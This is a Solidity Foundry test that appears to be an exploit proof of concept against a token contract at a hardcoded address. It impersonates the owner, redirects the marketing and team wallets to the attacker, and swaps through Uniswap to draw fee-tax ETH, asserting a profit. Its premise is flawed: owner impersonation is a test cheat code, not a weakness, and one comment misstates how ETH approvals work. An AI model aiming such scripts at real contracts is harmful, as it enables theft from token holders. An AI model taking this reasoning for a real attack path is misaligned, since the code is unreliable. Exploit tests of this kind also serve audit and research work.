// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TokenTool {
    function owner() external view returns (address);
    function setMarketingWalletAddress(address) external;
    function setTeamWalletAddress(address) external;
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function uniswapPair() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from the contract
        address owner = TokenTool(TARGET).owner();

        // Label addresses for debugging
        vm.label(owner, "Owner");
        vm.label(TARGET, "TokenTool");

        // Give attacker some ETH to work with
        deal(attacker, 10 ether);

        // Get the uniswap pair address
        address uniswapPair = TokenTool(TARGET).uniswapPair();
        vm.label(uniswapPair, "UniswapPair");

        // Get router address from the contract
        IUniswapV2Router02 router = TokenTool(TARGET).uniswapV2Router();
        vm.label(address(router), "Router");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get the owner address
        address owner = TokenTool(TARGET).owner();

        // Step 2: Impersonate owner and set marketing/team wallets to attacker
        vm.startPrank(owner);
        TokenTool(TARGET).setMarketingWalletAddress(attacker);
        TokenTool(TARGET).setTeamWalletAddress(attacker);
        vm.stopPrank();

        // Step 3: We need to accumulate tokens in the contract to trigger swapAndLiquify
        // The contract needs at least _minimumTokensBeforeSwap tokens (1 token with 18 decimals)
        // We'll buy tokens through the DEX pair, which will pay tax to the contract

        // First, approve router to spend our ETH
        uint256 buyAmount = 1 ether;

        // Get WETH address from router
        address weth = TokenTool(TARGET).uniswapV2Router().WETH();

        // Create path: WETH -> Token
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // Record initial ETH balance for oracle check
        uint256 initialAttackerBalance = attacker.balance;

        // Buy tokens with ETH (this will pay buy tax to contract)
        TokenTool(TARGET).uniswapV2Router().swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyAmount}(
            0, // accept any amount of tokens
            path,
            attacker,
            block.timestamp
        );

        // The contract should now have tax tokens and may trigger swapAndLiquify
        // If not triggered automatically, we might need to sell some tokens too

        // Let's also sell some tokens to ensure swap triggers
        uint256 tokenBalance = TokenTool(TARGET).balanceOf(attacker);
        if (tokenBalance > 0) {
            // Approve router to spend tokens
            TokenTool(TARGET).approve(address(TokenTool(TARGET).uniswapV2Router()), tokenBalance / 2);

            // Create reverse path: Token -> WETH
            address[] memory sellPath = new address[](2);
            sellPath[0] = TARGET;
            sellPath[1] = weth;

            // Sell half of tokens
            TokenTool(TARGET).uniswapV2Router().swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenBalance / 2,
                0, // accept any amount of ETH
                sellPath,
                attacker,
                block.timestamp
            );
        }

        // Check final balance for oracle
        uint256 finalAttackerBalance = attacker.balance;
        require(finalAttackerBalance > initialAttackerBalance, "Exploit failed: ETH balance did not increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

